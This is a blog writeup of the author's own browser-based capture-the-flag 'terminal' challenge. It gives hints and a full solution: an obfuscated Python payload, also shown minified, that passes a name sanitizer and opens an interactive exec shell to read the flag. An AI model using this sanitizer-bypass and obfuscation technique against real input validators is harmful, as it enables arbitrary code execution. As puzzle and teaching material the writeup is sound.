08/06/2024 17:00
[TAGS] python-golf gray
# Terminal Challenge

A writeup for the <DiscreetLink href='https://terminal.danielc.rocks'>hangman</DiscreetLink> challenge on my homepage. As far as I know it's a completely original challenge; if anything I'm proud of the implementation and how real the terminal feels. The core idea came from talking with a friend about writing a python file that sanitizes to a fixed string, reminiscent of <DiscreetLink href='https://en.wikipedia.org/wiki/Quine_(computing)'>quines</DiscreetLink>.

I used <ProminentLink href='https://pyodide.org/en/stable/'>Pyodide</ProminentLink> to run python in the browser (pretty cool!), which I heard about from my teacher at school, who used it to make the (well-known?) <DiscreetLink href='https://www.pythonsponge.com/'>Python Sponge</DiscreetLink>.

## Hint 1
<Spoiler>
The hangman game really is <ProminentLink href='https://youtu.be/le5uGqHKll8?t=550'>unbeatable</ProminentLink>. The goal of the challenge is to take advantage of the name loading and use that to read the flag.
</Spoiler>

## Hint 2
<Spoiler>
Look at the name verification function. If we can write some python code that sanitizes to `ErroryournamedoesntseemtobevalidIllcallyouMrUnimportant`, then we can input that as the name and it will pass the verification and thus be written to a file. Then we can run that file just like we ran `game.py`.

<br/>
So the goal is: write a python file that reads `/flag.txt`, whose alphanumeric characters in order are `Erroryour...`.
</Spoiler>

## Hint 3
<Spoiler>
Can you spot any python keywords in the sanitized error message? Research the built-in python functions and see which ones might be useful.

<br/>

We can have variables because underscores are allowed in python variable names.
Also we have numbers, by doing something like:

```py
_ = '' < '_' # one (compares ascii values)
__ = _+_+_+_ # four
___ = __*__ # sixteen
```
</Spoiler>

## Solution
<Spoiler>
What follows is one possible solution, that allows arbitrary code execution with a shell, so in particular you can read the flag file. Can you come up with an alternative?

<br/>

For readability, I've named all variables something representative, but they can all be replaced with underscores (see the minified version). The solution uses a <ProminentLink href='https://github.com/clemg/pythongolfer?tab=readme-ov-file#3---qa'>trick</ProminentLink> of encoding a utf-8 string in utf-16 to garble it.

```py
'Erroryo'
U,R,N = 'urn'
'amedoesn'
T,S = 'ts'
'eemtob'
EVAL = eval
STR = EVAL(S+T+R)
I,D = 'id'
DIR = EVAL(D+I+R)
'IllcallyouMrUn'
ONE = ''<'_'
SEVEN = ONE+ONE+ONE+ONE+ONE+ONE+ONE
BUILTINS = STR(EVAL)[ONE:SEVEN-ONE]+I+N+S
FUNCS = DIR(EVAL('__import__("'+BUILTINS+'")'))
'ant'

EXEC = FUNCS[-SEVEN*SEVEN-ONE-ONE]
BYTES = FUNCS[-SEVEN*SEVEN-SEVEN-SEVEN-ONE-ONE]

# the garbage characters are a utf16 encoding of the utf8 shellcode, the decoded version is:
# while True: exec(input());

SHELLCODE = BYTES+'("桷汩⁥牔敵›硥捥椨灮瑵⤨㬩","'+U+STR(SEVEN+SEVEN+ONE+ONE)+'")['+STR(ONE+ONE)+':]'

EVAL(EXEC+'('+SHELLCODE+')')
```

<br/>

<div className='inline'>
And the reduced version:
</div>

__COPIABLE__
```py
'Erroryo';________,_____,_________='urn';'amedoesn';__________,______='ts';'eemtob';___=eval;____,___________='id';'IllcallyouMrUn';_=''<'_';__=_+_+_+_+_+_+_;___((____________:=___(___________+____+_____)(___('__import__("'+(_______:=___(______+__________+_____))(___)[_:__-_]+____+_________+______+'")')))[-__*__-_-_]+'('+____________[-__*__-__-__-_-_]+'("桷汩⁥牔敵›硥捥椨灮瑵⤨㬩","'+________+_______(__+__+_+_)+'")['+_______(_+_)+':]'+')');'ant'
```
</Spoiler>


## FAQs

<div className="flex flex-col divide-y divide-border-strong">
    <details className="faq-question">
        <summary>How did you get Python to run in the browser???</summary>
        <div>
            I talked to my comp-sci teacher who helps run this <DiscreetLink href='https://www.pythonsponge.com/'>educational tool</DiscreetLink> - and he told me about how they use <DiscreetLink href='https://pyodide.org/en/stable/'>Pyodide</DiscreetLink> and a <DiscreetLink href='https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers'>web worker</DiscreetLink>. So I implemented that.
        </div>
    </details>
    <details className="faq-question">
        <summary>This is all client-side, so shouldn't I be able to cheese the flag by just looking in F12?</summary>
        <div className="space-y-2">
            <p>
                Indeed there used to be a cheese solution by just going into F12 and realising that <code>init.py</code> contained the flag (thanks @xp3dx) - but I moved it &gt;:)
            </p>
            <p>
                I have no idea if the flag is still accessible like this because I don't know enough about Next.js, but I will tell you that in my Next.js app it's in <code>components/challenge.js</code> - feel free to try and hunt for it in whatever obsfucated garbage Next.js gives you...
            </p>
        </div>
    </details>
</div>